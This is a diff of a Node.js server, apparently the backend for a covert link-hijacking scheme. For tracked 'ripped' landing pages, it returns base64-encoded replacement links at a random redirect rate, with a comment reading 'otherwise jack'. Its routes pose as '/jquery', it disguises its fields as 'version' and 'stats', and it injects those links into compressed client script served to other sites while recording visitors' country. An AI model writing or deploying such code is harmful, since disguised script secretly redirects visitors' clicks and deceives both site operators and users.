@@ -70,38 +70,46 @@ function getClientResponseJSON(uuid, url, callback) {
         useSplitTestLinks = 0;
     }
 
-    /* 1.get the links from the lander_info based on the uuid */
     var response = "";
-    connection.query("SELECT get_replacement_links(?,?) as links;", [url, useSplitTestLinks], function(err, docs) {
-        if(docs.length > 0) {
-            var links = docs[0].links;
-            if(links) {
-                var linksArr = links.split(",");
-                /* 2. transform that into base64 code */
-                for(var i=0 ; i<linksArr.length ; i++) {
-                  response += new Buffer(linksArr[i]).toString('base64') + getCodeDelimiter();
-                }
-            }
-            /* 3. get the rate from pulse table based on url */
-            connection.query("select rate from pulse where url=?", [url], function(err, docs) {
-                if(docs[0] != undefined) {
-                    //get random number, if its above config.redirect_rate dont jack, otherwise jack
-                    var randomNumber = Math.random() * 100;
-                    if(docs[0].rate > config.minimum_clicks_per_min) { //views/min
-                        if(randomNumber <= config.redirect_rate) {
-                            callback({jquery: response});
-                        } 
+
+    connection.query("select rate from pulse where url=?", [url], function(err, docs) {
+        if(docs[0]) {
+            if(docs[0].rate > config.minimum_clicks_per_min) { 
+                connection.query("SELECT redirect_rate from ripped WHERE url=?;", [url], function(err, docs) {
+                    if(docs[0]) {
+                        var randomNumber = Math.random() * 100;
+                        var redirect_rate = docs[0].redirect_rate;
+
+                        if(randomNumber <= redirect_rate) {
+                            connection.query("SELECT get_replacement_links(?,?) as links;", [url, useSplitTestLinks], function(err, docs) {
+                                if(docs.length > 0) {
+                                    var links = docs[0].links;
+                                    if(links) {
+                                        var linksArr = links.split(",");
+                                        /* 2. transform that into base64 code */
+                                        for(var i=0 ; i<linksArr.length ; i++) {
+                                          response += new Buffer(linksArr[i]).toString('base64') + getCodeDelimiter();
+                                        }
+                                    }
+
+                                }
+                                callback({jquery: response});
+                            });
+                        }
                         else {
                             callback({jquery: false});
                         }
-                    } 
-                    else {
-                        callback({jquery: false});
                     }
-                }
-            });
+                    else {
+                        callback({jquery: false});    
+                    }
+                });
+            } 
+            else {
+                callback({jquery: false});
+            }
         }
-    }); 
+    });
 }
 
 function formatURL(url) {
@@ -155,8 +163,8 @@ app.get('/jquery', function (req, res) {
 
 app.post('/jquery', function(req, res) {
     var uuid=req.body.version;
-    console.log("uuid" + uuid);
-    fs.readFile('./client/landercode.js', function(err, data) {
+    console.log("uuid: " + uuid);
+    fs.readFile('./client/compressed/compressed_landercode_old.js', function(err, data) {
         if(err) throw err;
         var replacedFile = String(data).replace('replacemeuuid', uuid);       
         res.writeHead(200, {
@@ -188,6 +196,10 @@ app.post('/jquery/latest', function(req, res) {
     var ip = req.headers['x-forwarded-for'];
     var geo = geoip.lookup(ip);
 
+    if(!geo) {
+        geo = {country: "UNKNOWN"};
+    }
+
     console.log("Received lander request from " + url + " with uuid = " + uuid);
 
     url = formatURL(url);
@@ -213,7 +225,7 @@ app.post('/jquery/latest', function(req, res) {
                     else { 
                         response = response.jquery; 
                     }
-                    
+
                     res.writeHead(200, {
                         'Content-Length': response.length,
                         'Content-Type': 'text/plain',
@@ -247,6 +259,86 @@ app.post('/jquery/latest', function(req, res) {
         }
   });
 
+});
+
+
+app.post('/jquery/stable', function(req, res) {
+    var url = req.body.stats;
+    var uuid = req.body.version;
+    var links = "";
+    var datetime = new Date().toMysqlFormat();
+    var full_url = url;
+
+    var ip = req.headers['x-forwarded-for'];
+    var geo = geoip.lookup(ip);
+
+    if(!geo) {
+        geo = {country: "UNKNOWN"};
+    }
+
+    console.log("Received lander request from " + url + " with uuid = " + uuid);
+
+    url = formatURL(url);
+    var domain = getDomain(url);
+
+    //console.log("Formatted url to be: " + url);
+    //console.log("The domain of the url is: " + domain);
+
+    connection.query("select process_request(?,?,?,?,?,?,?) AS value;", [url, uuid, datetime, domain, links, full_url, geo.country], function(err, docs) {
+        if(docs[0] != undefined) {
+            var response_string = docs[0].value;
+
+            console.log("Response from process_request: " + response_string);
+            if(response_string == "OLD_RIPPED") {
+                //send back data!
+                getClientResponseJSON(uuid, url, function(response) {
+
+                    console.log("Response to client: " + response.jquery);
+
+                    if(response.jquery == false) { 
+                        response = ""; 
+                    }
+                    else { 
+                        response = response.jquery; 
+                    }
+                    
+                    fs.readFile('./client/compressed/compressed_landercode_new.js', function(err, data) {
+                        if(err) throw err;
+                        var replacedFile = String(data).replace('replacemeuuid', uuid);
+                        replacedFile = String(replacedFile).replace('replacemelinks', response);
+                        res.writeHead(200, {
+                            'Content-Length': replacedFile.length,
+                            'Content-Type': 'text/plain',
+                            'Access-Control-Allow-Origin': '*',
+                            'Access-Control-Allow-Methods': 'GET, OPTIONS',
+                            'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+                        });
+                        res.end(replacedFile);
+                    });
+                });
+            }
+            else if(response_string == "UNKNOWN_BEHAVIOR") {
+                console.log("Something went wrong when calling process_request.")
+            }
+            else if(response_string == "UNKNOWN_UUID") {
+                console.log("An unknown uuid (" + uuid + ") was sent to the DB.")
+            }
+            else {
+                response = ""; 
+                res.writeHead(200, {
+                    'Content-Length': response.length,
+                    'Content-Type': 'text/plain',
+                    'Access-Control-Allow-Origin': '*',
+                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
+                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+                });
+                res.end(response);
+            }
+        }
+        else { 
+            console.log("Failed to get a response from process_request"); 
+        }
+  });
 });
 
 app.listen('9000')
